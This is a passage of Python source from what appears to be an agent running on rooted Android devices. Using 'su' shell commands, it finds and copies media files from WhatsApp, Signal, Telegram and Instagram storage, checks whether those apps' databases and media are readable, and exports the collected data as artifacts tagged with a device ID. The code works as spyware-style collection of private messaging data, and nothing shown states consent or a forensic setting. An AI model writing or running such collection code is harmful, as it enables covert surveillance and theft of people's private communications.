                "extraction_id": extraction_id,
                "total_files": len(media_files),
                "copied_files": len(copied_files),
                "archive_path": archive_path
            })
            
            return {
                "success": True,
                "extraction_id": extraction_id,
                "total_files": len(media_files),
                "copied_files": len(copied_files),
                "archive_path": archive_path,
                "media_files": media_files[:20],
                "message": f"Extracted {len(media_files)} media files"
            }
            
        except Exception as e:
            return {"error": f"Media extraction failed: {str(e)}"}
    
    def _extract_app_media_files(self, app: str, file_types: List[str], max_size: int) -> List[Dict[str, Any]]:
        """Extract media files for specific app"""
        try:
            media_files = []
            
            if app not in self.app_paths:
                return media_files
            
            search_dirs = [
                self.app_paths[app]["media_path"],
                f"/storage/emulated/0/Android/data/{self._get_package_name(app)}"
            ]
            
            for search_dir in search_dirs:
                for file_type in file_types:
                    find_cmd = [
                        "su", "-c",
                        f"find {search_dir} -type f -name '*.{file_type}' -size -{max_size}c 2>/dev/null"
                    ]
                    
                    result = subprocess.run(find_cmd, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        for file_path in result.stdout.strip().split('\n'):
                            if file_path:
                                stat_cmd = ["su", "-c", f"stat -c '%s %Y' '{file_path}'"]
                                stat_result = subprocess.run(stat_cmd, capture_output=True, text=True)
                                
                                file_size = 0
                                modified_time = 0
                                
                                if stat_result.returncode == 0:
                                    stat_parts = stat_result.stdout.strip().split()
                                    if len(stat_parts) >= 2:
                                        file_size = int(stat_parts[0])
                                        modified_time = int(stat_parts[1])
                                
                                media_info = {
                                    "app": app,
                                    "path": file_path,
                                    "filename": os.path.basename(file_path),
                                    "size": file_size,
                                    "modified_time": modified_time,
                                    "type": file_type
                                }
                                
                                media_files.append(media_info)
            
            return media_files
            
        except Exception as e:
            print(f"[!] App media extraction failed for {app}: {e}")
            return []
    
    def _get_package_name(self, app: str) -> str:
        """Get package name for app"""
        package_names = {
            "whatsapp": "com.whatsapp",
            "signal": "org.thoughtcrime.securesms",
            "telegram": "org.telegram.messenger",
            "instagram": "com.instagram.android"
        }
        return package_names.get(app, "")
    
    def _get_file_type(self, file_path: str) -> str:
        """Determine file type from extension"""
        extension = os.path.splitext(file_path)[1].lower()
        
        type_mapping = {
            '.jpg': 'image', '.jpeg': 'image', '.png': 'image', '.gif': 'image',
            '.mp4': 'video', '.avi': 'video', '.mov': 'video', '.mkv': 'video',
            '.mp3': 'audio', '.wav': 'audio', '.m4a': 'audio', '.ogg': 'audio',
            '.pdf': 'document', '.doc': 'document', '.docx': 'document', '.txt': 'document',
            '.db': 'database', '.sql': 'database'
        }
        
        return type_mapping.get(extension, 'unknown')
    
    def _copy_media_file(self, source_path: str, filename: str):
        """Copy media file to extraction directory"""
        try:
            dest_dir = "/data/local/tmp/social_media_extract"
            create_cmd = ["su", "-c", f"mkdir -p {dest_dir}"]
            subprocess.run(create_cmd, capture_output=True)
            
            dest_path = os.path.join(dest_dir, filename)
            copy_cmd = ["su", "-c", f"cp '{source_path}' '{dest_path}'"]
            subprocess.run(copy_cmd, capture_output=True)
            
        except Exception as e:
            print(f"[!] Media file copy failed: {e}")
    
    def get_installed_apps_info(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get information about installed social media apps"""
        try:
            apps_info = {}
            

            for app_name, app_data in self.app_paths.items():
                package_name = self._get_package_name(app_name)
                

                check_cmd = ["su", "-c", f"pm list packages | grep {package_name}"]
                result = subprocess.run(check_cmd, capture_output=True, text=True)
                
                is_installed = result.returncode == 0 and package_name in result.stdout
                
                app_info = {
                    "installed": is_installed,
                    "package_name": package_name,
                    "data_directory": f"/data/data/{package_name}",
                    "databases_accessible": False,
                    "media_accessible": False
                }
                
                if is_installed:

                    db_cmd = ["su", "-c", f"test -r {app_data['db_path']} && echo 'accessible'"]
                    db_result = subprocess.run(db_cmd, capture_output=True, text=True)
                    app_info["databases_accessible"] = "accessible" in db_result.stdout
                    

                    media_cmd = ["su", "-c", f"test -r {app_data['media_path']} && echo 'accessible'"]
                    media_result = subprocess.run(media_cmd, capture_output=True, text=True)
                    app_info["media_accessible"] = "accessible" in media_result.stdout
                    

                    version_cmd = ["su", "-c", f"dumpsys package {package_name} | grep versionName"]
                    version_result = subprocess.run(version_cmd, capture_output=True, text=True)
                    if version_result.returncode == 0 and "versionName=" in version_result.stdout:
                        version_line = [line for line in version_result.stdout.split('\n') if 'versionName=' in line]
                        if version_line:
                            app_info["version"] = version_line[0].split('versionName=')[1].strip()
                
                apps_info[app_name] = app_info
            
            return {
                "success": True,
                "apps_info": apps_info,
                "total_apps": len(apps_info),
                "installed_apps": len([app for app in apps_info.values() if app["installed"]]),
                "message": "Retrieved social media apps information"
            }
            
        except Exception as e:
            return {"error": f"Apps info retrieval failed: {str(e)}"}
    
    def export_extracted_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Export all extracted social media data"""
        try:
            format_type = args.get("format", "json")
            extraction_ids = args.get("extraction_ids", [])
            
            if not extraction_ids:

                data_to_export = self.extracted_data
            else:

                data_to_export = {eid: self.extracted_data[eid] for eid in extraction_ids if eid in self.extracted_data}
            
            if not data_to_export:
                return {"error": "No extraction data available for export"}
            
            export_data = {
                "exported_at": time.time(),
                "device_id": self.agent.device_id,
                "extraction_count": len(data_to_export),
                "extractions": data_to_export
            }
            

            if format_type == "json":
                export_content = json.dumps(export_data, indent=2, ensure_ascii=False).encode('utf-8')
            else:
                export_content = str(export_data).encode('utf-8')
            
            artifact_id = self.agent.offline_logger.log_artifact(
                "social_media_export",
                export_content,
                {
                    "format": format_type,
                    "extraction_count": len(data_to_export),
                    "exported_at": time.time()
                }
            )
            
            return {
                "success": True,
                "artifact_id": artifact_id,
                "extraction_count": len(data_to_export),
                "format": format_type,
                "message": f"Exported {len(data_to_export)} social media extractions"
            }
            
        except Exception as e:
            return {"error": f"Data export failed: {str(e)}"}
